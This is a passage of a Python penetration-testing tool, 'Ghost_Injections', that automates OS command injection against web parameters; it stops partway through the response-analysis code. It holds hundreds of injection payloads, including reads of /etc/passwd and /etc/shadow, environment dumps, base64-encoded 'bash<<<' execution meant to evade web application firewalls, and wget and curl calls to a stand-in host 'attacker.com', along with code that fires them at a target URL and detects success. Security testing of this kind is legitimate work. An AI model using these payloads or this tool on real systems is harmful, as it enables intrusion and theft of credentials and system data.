#!/usr/bin/env python3
"""
Ghost_Injections - Advanced Command Injection Testing Framework
Ghost Ops Security - Professional Penetration Testing Tool
Author: Ghost Ops Security Team
Version: 2.0
Purpose: Comprehensive automated command injection vulnerability detection and exploitation
"""

import requests
import argparse
import sys
import time
import urllib.parse
import re
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Set
import json
from datetime import datetime
import random
import string

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class GhostInjections:
    def __init__(self, url: str, method: str = "GET", headers: Dict = None, 
                 cookies: Dict = None, timeout: int = 10, proxy: Dict = None,
                 delay: float = 0, verbose: bool = False, user_agent: str = None):
        self.url = url
        self.method = method.upper()
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.proxy = proxy
        self.delay = delay
        self.verbose = verbose
        self.vulnerabilities = []
        self.tested_payloads = 0
        self.baseline_response_time = None
        self.baseline_response_length = None
        self.response_captures = []  # Store detailed HTTP transactions
        self.front_end_validation_detected = False
        
        # Set user agent
        if user_agent:
            self.headers['User-Agent'] = user_agent
        elif 'User-Agent' not in self.headers:
            self.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        
        # Generate random marker for this session
        self.session_marker = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        
        # Command Injection Operators Reference
        # Based on industry standard testing methodology
        self.injection_operators = {
            "semicolon": {
                "char": ";",
                "url_encoded": "%3b",
                "execution": "Both commands execute",
                "platforms": "Linux, Windows PowerShell (not Windows CMD)"
            },
            "newline": {
                "char": "\\n",
                "url_encoded": "%0a",
                "execution": "Both commands execute",
                "platforms": "All platforms"
            },
            "background": {
                "char": "&",
                "url_encoded": "%26",
                "execution": "Both execute (second output shown first)",
                "platforms": "All platforms"
            },
            "pipe": {
                "char": "|",
                "url_encoded": "%7c",
                "execution": "Both execute (only second output shown)",
                "platforms": "All platforms"
            },
            "and": {
                "char": "&&",
                "url_encoded": "%26%26",
                "execution": "Both execute (only if first succeeds)",
                "platforms": "All platforms"
            },
            "or": {
                "char": "||",
                "url_encoded": "%7c%7c",
                "execution": "Second executes (only if first fails)",
                "platforms": "All platforms"
            },
            "subshell_backtick": {
                "char": "`",
                "url_encoded": "%60",
                "execution": "Both execute (Linux-only)",
                "platforms": "Linux/Unix only"
            },
            "subshell_dollar": {
                "char": "$()",
                "url_encoded": "%24%28%29",
                "execution": "Both execute (Linux-only)",
                "platforms": "Linux/Unix only"
            }
        }
        
        # Extensive command injection payloads categorized by technique
        # Testing methodology: append command through various injection methods
        # If output changes from intended result, vulnerability is confirmed
        self.payloads = {
            "basic_unix_semicolon": [
                "; whoami",
                "; id",
                "; pwd",
                "; uname -a",
                "; cat /etc/passwd",
                "; ls -la",
                "test; whoami",
                "test; id",
                "127.0.0.1; whoami",
            ],
            "basic_unix_pipe": [
                "| whoami",
                "| id",
                "| pwd",
                "| uname -a",
                "test | whoami",
                "127.0.0.1 | whoami",
            ],
            "basic_unix_or": [
                "|| whoami",
                "|| id",
                "|| pwd",
                "|| uname -a",
                "test || whoami",
                "invalid_cmd || whoami",
            ],
            "basic_unix_and": [
                "& whoami",
                "&& whoami",
                "& id",
                "&& id",
                "& pwd",
                "&& pwd",
                "test & whoami",
                "test && whoami",
            ],
            "basic_unix_backticks": [
                "`whoami`",
                "`id`",
                "`pwd`",
                "`uname -a`",
                "test`whoami`",
                "127.0.0.1`whoami`",
            ],
            "basic_unix_substitution": [
                "$(whoami)",
                "$(id)",
                "$(pwd)",
                "$(uname -a)",
                "test$(whoami)",
                "127.0.0.1$(whoami)",
            ],
            "basic_windows": [
                "& whoami",
                "&& whoami",
                "| whoami",
                "|| whoami",
                "& net user",
                "&& net user",
                "| net user",
                "& ipconfig",
                "&& ipconfig",
            ],
            "time_based_unix_sleep": [
                "; sleep 7",
                "| sleep 7",
                "|| sleep 7",
                "& sleep 7",
                "&& sleep 7",
                "`sleep 7`",
                "$(sleep 7)",
                "test; sleep 7",
                "127.0.0.1; sleep 7",
                "test && sleep 7",
                "invalid || sleep 7",
            ],
            "time_based_windows": [
                "& timeout 7",
                "&& timeout 7",
                "| timeout 7",
                "& ping -n 8 127.0.0.1",
                "&& ping -n 8 127.0.0.1",
                "| ping -n 8 127.0.0.1",
                "& waitfor /t 7 ghostops",
            ],
            "output_marker_basic": [
                f"; echo {self.session_marker}",
                f"| echo {self.session_marker}",
                f"|| echo {self.session_marker}",
                f"& echo {self.session_marker}",
                f"&& echo {self.session_marker}",
                f"`echo {self.session_marker}`",
                f"$(echo {self.session_marker})",
            ],
            "output_marker_wrapped": [
                f"; echo START{self.session_marker}END",
                f"| echo START{self.session_marker}END",
                f"&& echo START{self.session_marker}END",
                f"; printf {self.session_marker}",
                f"| printf {self.session_marker}",
            ],
            "double_encoded": [
                "%253B%2520whoami",  # Double encoded ; whoami
                "%257C%2520whoami",  # Double encoded | whoami
                "%2526%2520whoami",  # Double encoded & whoami
                "%2524(whoami)",     # Double encoded $(whoami)
            ],
            "url_encoded": [
                "%3B%20whoami",      # ; whoami
                "%7C%20whoami",      # | whoami
                "%26%20whoami",      # & whoami
                "%26%26%20whoami",   # && whoami
                "%3B%20id",          # ; id
                "%7C%20id",          # | id
                "%60whoami%60",      # `whoami`
                "%24(whoami)",       # $(whoami)
            ],
            "unicode_encoded": [
                "\\u003b whoami",    # ; whoami
                "\\u007c whoami",    # | whoami
                "\\u0026 whoami",    # & whoami
            ],
            "obfuscated_spaces": [
                ";whoami",
                "|whoami",
                "||whoami",
                "&&whoami",
                ";${IFS}whoami",
                "|${IFS}whoami",
                ";$IFS$9whoami",
                ";\t whoami",
                ";\twhoami",
            ],
            "obfuscated_commands": [
                ";w`h`o`a`m`i",
                ";who$()ami",
                ";/usr/bin/whoami",
                ";/bin/wh''oami",
                ";wh\\oa\\mi",
                ";w'h'o'a'm'i",
                ';w"h"o"a"m"i',
                ";/bin/echo${IFS}test",
                ";ca\\t${IFS}/etc/pa\\sswd",
            ],
            "obfuscated_variables": [
                ";$0whoami",
                ";${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}whoami",
                ";i''d",
                ";p''wd",
            ],
            "newline_injection": [
                "%0a whoami",
                "%0d whoami",
                "%0a%0d whoami",
                "%0d%0a whoami",
                "\n whoami",
                "\r whoami",
                "\r\n whoami",
                "%0a id",
                "%0d id",
                "\n id",
            ],
            "null_byte": [
                ";whoami%00",
                "|whoami%00",
                "||whoami%00",
                "&&whoami%00",
                ";whoami\x00",
            ],
            "path_traversal_combo": [
                "../../../../bin/sh; whoami",
                "../../../../bin/sh; id",
                "..\\..\\..\\..\\windows\\system32\\cmd.exe /c whoami",
            ],
            "semicolon_variants": [
                "; whoami #",
                "; whoami //",
                "; whoami --",
                "; whoami ||",
                "; whoami | grep",
                "; whoami 2>&1",
                "; whoami >/dev/null",
            ],
            "inline_execution": [
                "test`whoami`test",
                "test$(whoami)test",
                "test|whoami|test",
                "127.0.0.1`whoami`127.0.0.1",
                "localhost$(id)localhost",
            ],
            "chained_commands": [
                "; whoami; id",
                "; whoami; pwd",
                "| whoami | id",
                "&& whoami && id",
                "; id; uname -a; pwd",
            ],
            "alternative_execution": [
                "; perl -e 'print \"test\"'",
                "; python -c 'print(\"test\")'",
                "; ruby -e 'puts \"test\"'",
                "; php -r 'echo \"test\";'",
                "; node -e 'console.log(\"test\")'",
            ],
            "redirection_based": [
                "; whoami > /tmp/output",
                "| whoami > /tmp/output",
                "; id >> /tmp/output",
                "; whoami 2>&1",
                "; cat /etc/passwd > /dev/null",
            ],
            "environment_variables": [
                "; printenv",
                "| printenv",
                "; env",
                "| env",
                "; echo $PATH",
                "; echo $HOME",
                "; echo $USER",
            ],
            "file_read_attempts": [
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "&& cat /etc/passwd",
                "; cat /etc/shadow",
                "; cat /proc/version",
                "; cat /etc/issue",
                "& type C:\\Windows\\win.ini",
            ],
            "network_based": [
                "; wget http://attacker.com",
                "; curl http://attacker.com",
                "; ping -c 1 attacker.com",
                "; nslookup attacker.com",
                "; dig attacker.com",
            ],
            "base64_obfuscation": [
                f"; echo {base64.b64encode(b'whoami').decode()} | base64 -d | sh",
                f"| echo {base64.b64encode(b'id').decode()} | base64 -d | sh",
                f"; echo {base64.b64encode(b'pwd').decode()} | base64 -d | bash",
            ],
            "wildcard_injection": [
                "; /bin/wh?ami",
                "; /bin/who*",
                "; /usr/bin/i?",
                "| /bin/wh*ami",
            ],
            "concatenation_bypass": [
                "; wh''oami",
                "; w''hoami",
                "; who''ami",
                '; wh""oami',
                '; ""whoami',
            ],
            # New comprehensive operator testing category
            # Based on expected input + operator + command pattern
            "all_operators_comprehensive": [
                # Semicolon (;) - executes both commands
                "127.0.0.1; whoami",
                "127.0.0.1; id",
                "localhost; whoami",
                "8.8.8.8; whoami",
                # Newline (\n) - executes both commands
                "127.0.0.1\n whoami",
                "127.0.0.1%0a whoami",
                "localhost%0a id",
                "8.8.8.8%0d%0a whoami",
                # Background (&) - both execute, second output shown first
                "127.0.0.1 & whoami",
                "localhost & id",
                "8.8.8.8 & whoami",
                # Pipe (|) - both execute, only second output shown
                "127.0.0.1 | whoami",
                "localhost | id",
                "8.8.8.8 | whoami",
                # AND (&&) - both execute only if first succeeds
                "127.0.0.1 && whoami",
                "localhost && id",
                "8.8.8.8 && whoami",
                # OR (||) - second executes only if first fails
                "invalid_host || whoami",
                "fake_ip || id",
                "notreal || whoami",
                # Sub-Shell backtick (`) - Linux only
                "127.0.0.1`whoami`",
                "localhost`id`",
                "`whoami`127.0.0.1",
                # Sub-Shell $() - Linux only
                "127.0.0.1$(whoami)",
                "localhost$(id)",
                "$(whoami)127.0.0.1",
            ],
            # Ping command specific injections (most common vulnerable command)
            "ping_command_injection": [
                # These assume input goes into: ping -c 1 OUR_INPUT
                "127.0.0.1; whoami",
                "127.0.0.1 | whoami",
                "127.0.0.1 & whoami",
                "127.0.0.1 && whoami",
                "127.0.0.1 || whoami",
                "127.0.0.1`whoami`",
                "127.0.0.1$(whoami)",
                "127.0.0.1%0a whoami",
                "127.0.0.1%3b whoami",
                "127.0.0.1%7c whoami",
                "127.0.0.1%26 whoami",
                "127.0.0.1%26%26 whoami",
            ],
            # Advanced WAF bypass techniques - proven in real-world testing
            # Based on successful bypasses against input validation/WAF
            "advanced_waf_bypass": [
                # Base64 encoding with newline and bash heredoc
                # Pattern: %0abash<<<$(base64%09-d<<<BASE64_PAYLOAD)
                # Bypasses: keyword filters, command detection, space filters
                "%0abash<<<$(base64%09-d<<<bHM=)",                    # ls
                "%0abash<<<$(base64%09-d<<<d2hvYW1p)",                # whoami
                "%0abash<<<$(base64%09-d<<<aWQ=)",                    # id
                "%0abash<<<$(base64%09-d<<<cHdk)",                    # pwd
                "%0abash<<<$(base64%09-d<<<dW5hbWUgLWE=)",            # uname -a
                "%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)",    # cat /etc/passwd
                "%0abash<<<$(base64%09-d<<<bHMgLWxh)",                # ls -la
                # Newline exploitation (bypasses semicolon filters)
                "%0awhoami",
                "%0aid",
                "%0als",
                "%0acat /etc/passwd",
                "%0d%0awhoami",
                # Quote obfuscation inside commands (bypasses keyword matching)
                ";i''d",
                ";w''hoami",
                ";p''wd",
                ";l''s",
                ";c''at /etc/passwd",
                ";/bin/i''d",
                ";/usr/bin/w''hoami",
                # Backslash obfuscation (bypasses pattern matching)
                ";wh\\oa\\mi",
                ";i\\d",
                ";p\\wd",
                ";l\\s",
                ";ca\\t /etc/passwd",
                # Combined techniques
                "%0aw''hoami",
                "%0ai''d",
                ";/bin/wh''oami",
            ],
            # Base64 command encoding variations
            "base64_encoding_bypass": [
                # Standard base64 decode patterns
                "; echo d2hvYW1p | base64 -d | sh",                   # whoami
                "; echo aWQ= | base64 -d | sh",                       # id
                "; echo bHM= | base64 -d | sh",                       # ls
                "; echo cHdk | base64 -d | sh",                       # pwd
                "| echo d2hvYW1p | base64 -d | sh",
                "&& echo d2hvYW1p | base64 -d | sh",
                # Bash heredoc with base64
                "; bash<<<$(base64 -d<<<d2hvYW1p)",
                "; bash<<<$(base64 -d<<<aWQ=)",
                "| bash<<<$(base64 -d<<<d2hvYW1p)",
                # Without spaces using $IFS
                ";echo${IFS}d2hvYW1p|base64${IFS}-d|sh",
            ],
            # Newline and carriage return exploitation
            "newline_exploitation": [
                # These bypass semicolon and other operator filters
                "%0awhoami%0a",
                "%0aid%0a",
                "%0als%0a",
                "%0acat /etc/passwd%0a",
                "%0duname -a%0d",
                "%0d%0awhoami%0d%0a",
                # With commands that don't need spaces
                "%0awhoami",
                "%0aid",
                "%0apwd",
                # Multiple newlines
                "%0a%0awhoami",
                "%0a%0a%0awhoami",
            ],
        }
        
        # Comprehensive detection patterns
        # Detection methodology: Look for changes in output from intended result
        # If command output appears in response, injection was successful
        self.detection_patterns = {
            "unix_users": [
                "root", "www-data", "apache", "nginx", "daemon", "nobody",
                "http", "httpd", "ubuntu", "debian", "centos", "admin"
            ],
            "unix_groups": [
                "root", "wheel", "sudo", "adm", "www-data", "apache"
            ],
            "windows_users": [
                "nt authority", "system", "administrator", "nt authority\\system",
                "network service", "local service"
            ],
            "unix_paths": [
                "/bin/", "/usr/bin/", "/sbin/", "/usr/sbin/", "/home/",
                "/root/", "/etc/", "/var/", "/tmp/", "/opt/"
            ],
            "windows_paths": [
                "c:\\windows", "c:\\users", "c:\\program files",
                "\\windows\\", "\\users\\", "\\system32\\"
            ],
            "file_contents": [
                "/etc/passwd", "root:x:", "bin:x:", "daemon:x:",
                "nobody:x:", "www-data:x:"
            ],
            "system_info": [
                "linux", "gnu", "ubuntu", "debian", "centos", "red hat",
                "kernel", "microsoft windows"
            ],
            "uid_gid": [
                "uid=", "gid=", "groups=", "euid=", "egid="
            ],
            "command_output": [
                "total", "drwx", "-rw-", "lrwx", # ls output
                "inet", "netmask", "broadcast", # ifconfig
            ],
            # Ping command specific output patterns
            "ping_output": [
                "packets transmitted", "packets received", "packet loss",
                "bytes from", "icmp_seq", "ttl=", "time=", "rtt min/avg/max",
                "ping statistics", "64 bytes from"
            ],
            # Additional command outputs
            "network_commands": [
                "tcp", "udp", "listening", "established", "netstat",
                "interface", "mtu", "rx packets", "tx packets"
            ],
        }

    def print_banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗              ║
║  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝              ║
║  ██║  ███╗███████║██║   ██║███████╗   ██║                 ║
║  ██║   ██║██╔══██║██║   ██║╚════██║   ██║                 ║
║  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║                 ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝                 ║
║                                                              ║
║     ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗        ║
║     ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝        ║
║     ██║██╔██╗ ██║     ██║█████╗  ██║        ██║           ║
║     ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║           ║
║     ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║           ║
║     ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝           ║
║                                                              ║
║        Advanced Command Injection Testing Framework         ║
║                    Ghost Ops Security                        ║
║                        Version 2.0                           ║
╚══════════════════════════════════════════════════════════════╝
{Colors.ENDC}
{Colors.YELLOW}[*] Target URL:{Colors.ENDC} {self.url}
{Colors.YELLOW}[*] HTTP Method:{Colors.ENDC} {self.method}
{Colors.YELLOW}[*] Session Marker:{Colors.ENDC} {self.session_marker}
{Colors.YELLOW}[*] Timeout:{Colors.ENDC} {self.timeout}s
{Colors.YELLOW}[*] Payload Categories:{Colors.ENDC} {len(self.payloads)}
{Colors.YELLOW}[*] Total Payloads:{Colors.ENDC} {sum(len(v) for v in self.payloads.values())}
{Colors.YELLOW}[*] Start Time:{Colors.ENDC} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Colors.CYAN}{'='*62}{Colors.ENDC}
"""
        print(banner)

    def _capture_http_transaction(self, request_data: Dict, response, payload: str, 
                                  param: str, is_vulnerable: bool, detection_type: str = None) -> Dict:
        """
        Capture full HTTP transaction details similar to Burp Suite
        This allows viewing the complete request/response cycle for analysis
        
        Purpose: When testing command injection, we need to see:
        1. The exact payload sent
        2. How it was encoded/formatted
        3. Full HTTP request (headers, body, method)
        4. Full HTTP response (status, headers, body)
        5. Response timing and size
        6. Detection results
        
        This mimics Burp Suite's Repeater functionality for offline analysis
        """
        transaction = {
            "timestamp": datetime.now().isoformat(),
            "parameter": param,
            "payload": payload,
            "url_encoded_payload": urllib.parse.quote(payload),
            "vulnerability_detected": is_vulnerable,
            "detection_type": detection_type,
            
            # Request details
            "request": {
                "method": self.method,
                "url": self.url,
                "headers": dict(self.headers),
                "cookies": dict(self.cookies),
                "data": request_data.copy() if request_data else None,
                "raw_request": self._build_raw_request(request_data, payload, param)
            },
            
            # Response details  
            "response": {
                "status_code": response.status_code,
                "status_text": response.reason,
                "headers": dict(response.headers),
                "body": response.text,
                "body_length": len(response.content),
                "response_time": None,  # Will be set by caller
                "truncated_body": response.text[:500] if len(response.text) > 500 else response.text
            },
            
            # Analysis
            "analysis": {
                "front_end_validation": self._check_front_end_validation(response),
                "contains_error": self._check_error_messages(response.text),
                "output_changed": None,  # Will be set by comparison
                "injection_indicators": []
            }
        }
        
        return transaction
    
    def _build_raw_request(self, data: Dict, payload: str, param: str) -> str:
        """Build raw HTTP request string for display (like Burp Suite)"""
        lines = []
        
        if self.method == "GET":
            # Build URL with parameters
            if '?' in self.url:
                base_url = self.url.split('?')[0]
                params = urllib.parse.parse_qs(self.url.split('?')[1])
                params = {k: v[0] for k, v in params.items()}
            else:
                base_url = self.url
                params = {}
            
            params[param] = payload
            query_string = urllib.parse.urlencode(params)
            full_url = f"{base_url}?{query_string}"
            
            lines.append(f"GET {full_url.replace(self.url.split('/')[0] + '//' + self.url.split('/')[2], '')} HTTP/1.1")
            lines.append(f"Host: {self.url.split('/')[2].split(':')[0]}")
        else:
            lines.append(f"POST {self.url.replace(self.url.split('/')[0] + '//' + self.url.split('/')[2], '')} HTTP/1.1")
            lines.append(f"Host: {self.url.split('/')[2].split(':')[0]}")
        
        # Add headers
        for key, value in self.headers.items():
            lines.append(f"{key}: {value}")
        
        # Add cookies
        if self.cookies:
            cookie_str = "; ".join([f"{k}={v}" for k, v in self.cookies.items()])
            lines.append(f"Cookie: {cookie_str}")
        
        # Add body for POST
        if self.method == "POST" and data:
            body_data = data.copy()
            body_data[param] = payload
            body = urllib.parse.urlencode(body_data)
            lines.append(f"Content-Length: {len(body)}")
            lines.append("")
            lines.append(body)
        
        return "\n".join(lines)
    
    def _check_front_end_validation(self, response) -> Dict:
        """
        Detect front-end validation attempts
        
        Common indicators:
        1. Response contains JavaScript validation errors
        2. Response has client-side validation messages
        3. Status code is 200 but with validation error in HTML
        4. No backend processing occurred (very fast response)
        """
        indicators = []
        detected = False
        
        response_lower = response.text.lower()
        
        # Check for common front-end validation patterns
        frontend_patterns = [
            "invalid format", "please enter a valid", "invalid input",
            "only accepts", "must be in format", "invalid ip",
            "validation error", "invalid characters",
            "alert(", "console.error(", "form validation",
            ".is-invalid", "error-message", "validation-error"
        ]
        
        for pattern in frontend_patterns:
            if pattern in response_lower:
                indicators.append(f"Found pattern: {pattern}")
                detected = True
        
        # Check for JavaScript validation functions
        js_validation_patterns = [
            r"validate\w+\(", r"check\w+\(", r"verify\w+\(",
            r"isValid\w*\(", r"validateForm\("
        ]
        
        for pattern in js_validation_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                indicators.append(f"Found JS validation: {pattern}")
                detected = True
        
        return {
            "detected": detected,
            "indicators": indicators,
            "note": "Front-end validation can be bypassed by sending requests directly to backend" if detected else None
        }
    
    def _check_error_messages(self, response_text: str) -> Dict:
        """Check for various error messages in response"""
        errors = []
        
        error_patterns = {
            "sql": ["sql", "mysql", "postgresql", "syntax error", "query failed"],
            "system": ["error", "exception", "failed", "warning", "cannot"],
            "validation": ["invalid", "not allowed", "rejected", "denied"],
            "execution": ["command", "exec", "system", "permission denied"]
        }
        
        response_lower = response_text.lower()
        
        for category, patterns in error_patterns.items():
            for pattern in patterns:
                if pattern in response_lower:
                    errors.append({
                        "category": category,
                        "pattern": pattern,
                        "context": self._extract_context(response_text, pattern, 100)
                    })
        
        return {
            "found": len(errors) > 0,
            "count": len(errors),
            "errors": errors[:5]  # Limit to first 5
        }
    
    def print_transaction_details(self, transaction: Dict, verbose: bool = False):
        """
        Print HTTP transaction details in a Burp Suite-style format
        Useful for understanding exactly what was sent and received
        """
        print(f"\n{Colors.CYAN}{'='*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}HTTP TRANSACTION CAPTURE{Colors.ENDC}")
        print(f"{Colors.CYAN}{'='*70}{Colors.ENDC}\n")
        
        # Vulnerability status
        if transaction['vulnerability_detected']:
            print(f"{Colors.RED}{Colors.BOLD}[!] VULNERABILITY DETECTED{Colors.ENDC}")
            print(f"    Detection Type: {transaction['detection_type']}")
        else:
            print(f"{Colors.GREEN}[+] No vulnerability detected{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}[*] Timestamp:{Colors.ENDC} {transaction['timestamp']}")
        print(f"{Colors.YELLOW}[*] Parameter:{Colors.ENDC} {transaction['parameter']}")
        print(f"{Colors.YELLOW}[*] Payload:{Colors.ENDC} {transaction['payload']}")
        print(f"{Colors.YELLOW}[*] URL Encoded:{Colors.ENDC} {transaction['url_encoded_payload']}")
        
        # Request details
        print(f"\n{Colors.CYAN}{Colors.BOLD}REQUEST:{Colors.ENDC}")
        print(f"{Colors.BLUE}{'─'*70}{Colors.ENDC}")
        if verbose:
            print(transaction['request']['raw_request'])
        else:
            print(f"Method: {transaction['request']['method']}")
            print(f"URL: {transaction['request']['url']}")
            if transaction['request']['data']:
                print(f"Data: {transaction['request']['data']}")
        
        # Response details
        print(f"\n{Colors.CYAN}{Colors.BOLD}RESPONSE:{Colors.ENDC}")
        print(f"{Colors.BLUE}{'─'*70}{Colors.ENDC}")
        print(f"Status: {transaction['response']['status_code']} {transaction['response']['status_text']}")
        print(f"Length: {transaction['response']['body_length']} bytes")
        
        if verbose:
            print(f"\nHeaders:")
            for key, value in transaction['response']['headers'].items():
                print(f"  {key}: {value}")
        
        # Show truncated body
        print(f"\n{Colors.YELLOW}Response Body Preview:{Colors.ENDC}")
        print(f"{Colors.BLUE}{'─'*70}{Colors.ENDC}")
        preview = transaction['response']['truncated_body']
        if len(preview) > 200 and not verbose:
            preview = preview[:200] + "..."
        print(preview)
        
        # Analysis
        print(f"\n{Colors.CYAN}{Colors.BOLD}ANALYSIS:{Colors.ENDC}")
        print(f"{Colors.BLUE}{'─'*70}{Colors.ENDC}")
        
        # Front-end validation
        fe_val = transaction['analysis']['front_end_validation']
        if fe_val['detected']:
            print(f"{Colors.YELLOW}[!] Front-end validation detected:{Colors.ENDC}")
            for indicator in fe_val['indicators'][:3]:
                print(f"    • {indicator}")
            print(f"    Note: {fe_val['note']}")
        
        # Errors
        errors = transaction['analysis']['contains_error']
        if errors['found']:
            print(f"\n{Colors.YELLOW}[!] Errors found in response:{Colors.ENDC}")
            for error in errors['errors'][:3]:
                print(f"    • [{error['category']}] {error['pattern']}")
        
        print(f"\n{Colors.CYAN}{'='*70}{Colors.ENDC}\n")
    
    def establish_baseline(self, param: str, data: Dict = None) -> bool:
        """Establish baseline response time and length"""
        try:
            if self.verbose:
                print(f"{Colors.BLUE}[*] Establishing baseline for parameter: {param}{Colors.ENDC}")
            
            baseline_values = []
            
            for i in range(3):  # Take 3 baseline measurements
                if self.method == "GET":
                    if '?' in self.url:
                        base_url = self.url.split('?')[0]
                        params = urllib.parse.parse_qs(self.url.split('?')[1])
                        params = {k: v[0] for k, v in params.items()}
                    else:
                        base_url = self.url
                        params = {}
                    
                    params[param] = "127.0.0.1"  # Benign value
                    
                    start_time = time.time()
                    response = requests.get(
                        base_url,
                        params=params,
                        headers=self.headers,
                        cookies=self.cookies,
                        timeout=self.timeout,
                        proxies=self.proxy,
                        allow_redirects=False
                    )
                    response_time = time.time() - start_time
                else:
                    test_data = data.copy() if data else {}
                    test_data[param] = "127.0.0.1"
                    
                    start_time = time.time()
                    response = requests.post(
                        self.url,
                        data=test_data,
                        headers=self.headers,
                        cookies=self.cookies,
                        timeout=self.timeout,
                        proxies=self.proxy,
                        allow_redirects=False
                    )
                    response_time = time.time() - start_time
                
                baseline_values.append({
                    'time': response_time,
                    'length': len(response.content)
                })
                
                time.sleep(0.5)  # Small delay between baseline requests
            
            # Calculate average baseline
            self.baseline_response_time = sum(b['time'] for b in baseline_values) / len(baseline_values)
            self.baseline_response_length = sum(b['length'] for b in baseline_values) / len(baseline_values)
            
            if self.verbose:
                print(f"{Colors.GREEN}[+] Baseline established:{Colors.ENDC}")
                print(f"    Average response time: {self.baseline_response_time:.3f}s")
                print(f"    Average response length: {int(self.baseline_response_length)} bytes")
            
            return True
            
        except Exception as e:
            if self.verbose:
                print(f"{Colors.RED}[-] Failed to establish baseline: {str(e)}{Colors.ENDC}")
            return False

    def test_payload(self, param: str, payload: str, data: Dict = None) -> Tuple[bool, str, Dict]:
        """Test a single payload against a parameter with enhanced detection and transaction capture"""
        try:
            if self.delay:
                time.sleep(self.delay)
            
            self.tested_payloads += 1
            test_data = data.copy() if data else {}
            
            if self.method == "GET":
                if '?' in self.url:
                    base_url = self.url.split('?')[0]
                    params = urllib.parse.parse_qs(self.url.split('?')[1])
                    params = {k: v[0] for k, v in params.items()}
                else:
                    base_url = self.url
                    params = {}
                
                params[param] = payload
                
                start_time = time.time()
                response = requests.get(
                    base_url,
                    params=params,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    proxies=self.proxy,
                    allow_redirects=False
                )
                response_time = time.time() - start_time
                
            else:  # POST
                test_data[param] = payload
                start_time = time.time()
                response = requests.post(
                    self.url,
                    data=test_data,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    proxies=self.proxy,
                    allow_redirects=False
                )
                response_time = time.time() - start_time
            
            # Analyze response for vulnerabilities
            is_vulnerable, detection_type, details = self.analyze_response(response, payload, response_time)
            
            # Only capture and display if vulnerable OR in verbose mode
            if is_vulnerable or self.verbose:
                # Capture full HTTP transaction
                transaction = self._capture_http_transaction(
                    test_data, response, payload, param, is_vulnerable, detection_type
                )
                transaction['response']['response_time'] = response_time
                
                # Store ONLY if vulnerable (for reporting)
                # In verbose mode, just display without storing all requests
                if is_vulnerable:
                    self.response_captures.append(transaction)
                    
                    # Display immediately on CLI in verbose mode
                    if self.verbose:
                        self.print_transaction_details(transaction, verbose=False)
            
            return is_vulnerable, detection_type, details
            
        except requests.exceptions.Timeout:
            result = {
                "payload": payload,
                "detection": "Request timeout - possible time-based blind injection",
                "response_time": self.timeout,
                "confidence": "HIGH"
            }
            return True, "timeout", result
        except requests.exceptions.ConnectionError as e:
            if self.verbose:
                print(f"{Colors.YELLOW}[!] Connection error: {str(e)}{Colors.ENDC}")
            return False, "error", {}
        except Exception as e:
            if self.verbose:
                print(f"{Colors.RED}[-] Error testing payload: {str(e)}{Colors.ENDC}")
            return False, "error", {}

    def analyze_response(self, response, payload: str, response_time: float) -> Tuple[bool, str, Dict]:
        """
        Comprehensive response analysis for command injection indicators
        
        DETECTION METHODOLOGY:
        The process of detecting OS Command Injection vulnerabilities involves
        attempting to append our command through various injection methods.
        If the command output changes from the intended usual result, we have
        successfully identified a vulnerability.
        
        We test by injecting additional commands using operators like:
        - Semicolon (;) - executes both commands
        - Newline (\n) - executes both commands  
        - Background (&) - both execute (second output shown first)
        - Pipe (|) - both execute (only second output shown)
        - AND (&&) - both execute (only if first succeeds)
        - OR (||) - second executes (only if first fails)
        - Sub-Shell (``, $()) - both execute (Linux-only)
        
        Pattern: expected_input + operator + injected_command
        Example: 127.0.0.1; whoami (for a ping command)
        
        If the response contains unexpected output (like username, file contents,
        system information, or time delays), the injection was successful.
        """
        result = {
            "payload": payload,
            "status_code": response.status_code,
            "response_time": response_time,
            "response_length": len(response.content),
            "confidence": "UNKNOWN"
        }
        
        response_text = response.text
        response_lower = response_text.lower()
        
        # HIGH CONFIDENCE DETECTIONS
        
        # 1. Check for session marker (highest confidence)
        if self.session_marker in response_text:
            result["detection"] = f"Custom session marker detected: {self.session_marker}"
            result["confidence"] = "CRITICAL"
            result["evidence"] = self._extract_context(response_text, self.session_marker)
            return True, "output_based_marker", result
        
        # 2. Check for wrapped marker
        wrapped_marker = f"START{self.session_marker}END"
        if wrapped_marker in response_text:
            result["detection"] = f"Wrapped session marker detected: {wrapped_marker}"
            result["confidence"] = "CRITICAL"
            result["evidence"] = self._extract_context(response_text, wrapped_marker)
            return True, "output_based_marker", result
        
        # 3. Check for uid/gid patterns (very strong indicator)
        for pattern in self.detection_patterns["uid_gid"]:
            if pattern in response_lower:
                result["detection"] = f"UID/GID pattern detected: {pattern}"
                result["confidence"] = "CRITICAL"
                result["evidence"] = self._extract_context(response_text, pattern)
                return True, "output_based_uid", result
        
        # 4. Check for /etc/passwd content
        for pattern in self.detection_patterns["file_contents"]:
            if pattern in response_lower:
